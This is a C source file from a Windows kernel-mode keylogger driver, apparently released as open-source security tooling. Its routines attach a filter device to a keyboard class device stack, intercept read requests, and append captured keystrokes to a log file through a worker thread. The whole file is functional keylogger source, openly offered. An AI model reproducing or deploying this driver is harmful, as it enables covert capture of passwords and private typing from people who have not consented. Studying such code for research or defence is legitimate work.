/*
 * Copyright 2022 Praetorian Security, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <ntddk.h>

#include "klogcompat.h"
#include "keylog.h"
#include "keymap.h"
#include "ntundoc.h"
#include "klogworker.h"
#include "keyboardio.h"

//
// Driver object used for all keylogger components
//

static PDRIVER_OBJECT KeyloggerDriver;

NTSTATUS
KeylogInit(
		IN PDRIVER_OBJECT DriverObject
	  )

/*++

  Routine Description:
  
  	Initializes the keylogging subsystem by setting up IRP major function
	handlers for the driver object associated with the keylogger

  Arguments:

	DriverObject - Driver object to be used by the keylogging subsystem

  Return Value:

	Returns success/failure NTSTATUS values

--*/

{
	unsigned int i = 0;

	//
	// Basic error checking of passed in driver object
	//

	if(DriverObject == NULL) {
		DbgPrint("[Keylog] Initialization failed driver object is null");
		return STATUS_UNSUCCESSFUL;

	}

	KeyloggerDriver = DriverObject;

	//
	// Filter driver needs to support pass through of 
	// unsupported IRPs to underlying device stack
	//

	for(i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = DispatchPassThrough;
	}

	DriverObject->MajorFunction[IRP_MJ_READ] = KeylogRead;

	return STATUS_SUCCESS;
}

NTSTATUS 
KeylogAttachDevice(
			PUNICODE_STRING KeyboardName,
			PUNICODE_STRING KeylogFilePath
		)

/*++

  Routine Description:
  
  	Attach to device stack of the specified keyboard device

  Arguments:

  	KeyboardName - Name of device object (e.g. KeyboardClass0)

	KeylogFilePat - File path to write keystrokes

  Return Value:

	Success/failure of attaching to device stack

--*/

{
	IO_STATUS_BLOCK file_status;
	NTSTATUS status = STATUS_SUCCESS;
	OBJECT_ATTRIBUTES obj_attrib;
	PKEYLOG_DEVICE_EXTENSION KeylogExtension;
	PDEVICE_OBJECT KeyboardDeviceObject;

	PAGED_CODE();

	status = IoCreateDevice(KeyloggerDriver, 
			sizeof(KEYLOG_DEVICE_EXTENSION), 
			NULL, 
			FILE_DEVICE_KEYBOARD, 
			0, 
			FALSE, 
			&KeyboardDeviceObject);

	if(!NT_SUCCESS(status)) { 
		DbgPrint("[Keylog] Failed to Create Device Object for Keylogger");
		return status;
	}

	//
	// Since we are acting as a filter driver our driver needs to have the same
	// flags/attributes as the underlying driver stack we are attaching to 
	// otherwise we will not be able to attach to device stack or BSOD
	// 

	KeyboardDeviceObject->Flags = KeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	KeyboardDeviceObject->Flags = KeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;

	//
	// Initialize device extension for device we are hooking
	//

	RtlZeroMemory(KeyboardDeviceObject->DeviceExtension, sizeof(KEYLOG_DEVICE_EXTENSION)); 
	KeylogExtension = (PKEYLOG_DEVICE_EXTENSION)KeyboardDeviceObject->DeviceExtension;

	//
	// Attach to device stack of driver
	//

	status = IoAttachDevice(KeyboardDeviceObject, 
			KeyboardName, 
			&KeylogExtension->KeyboardDevice);

	if(!NT_SUCCESS(status)) {
		DbgPrint("[Keylog] Failed to attach to device stack [%ws]", KeyboardName->Buffer);
		return status;
	}

	//
	// Initialize synchronization primitives between dispatch
	// routines and worker threads
	//

	InitializeListHead(&KeylogExtension->QueueListHead);
	KeInitializeSpinLock(&KeylogExtension->lockQueue);                                      
	KeInitializeSemaphore(&KeylogExtension->semQueue, 0 , MAXLONG); 

	//
	// Open logfile for keylogging module
	//
	
	InitializeObjectAttributes(&obj_attrib, 
			KeylogFilePath, 
			OBJ_CASE_INSENSITIVE, 
			NULL, 
			NULL);

	status = ZwCreateFile(&KeylogExtension->KeystrokeFile,
			FILE_APPEND_DATA, 
			&obj_attrib,
			&file_status, 
			NULL, 
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ,
		    FILE_OPEN_IF, 
			FILE_SYNCHRONOUS_IO_NONALERT, 
			NULL, 
			0);

	if(!NT_SUCCESS(status)) {
		DbgPrint("[Keylog] Failed to open keylog log file");
		KeylogExtension->KeystrokeFile = NULL;
	}

	//
	// Creating worker thread to handle logging of keypresses
	//

	status = InitializeKeylogWorker(KeyboardDeviceObject);

	if(!NT_SUCCESS(status)) {
		DbgPrint("[Keylog] Failed to start worker thread, keylogger initialization failed");
		return status;
	}

	return status;
}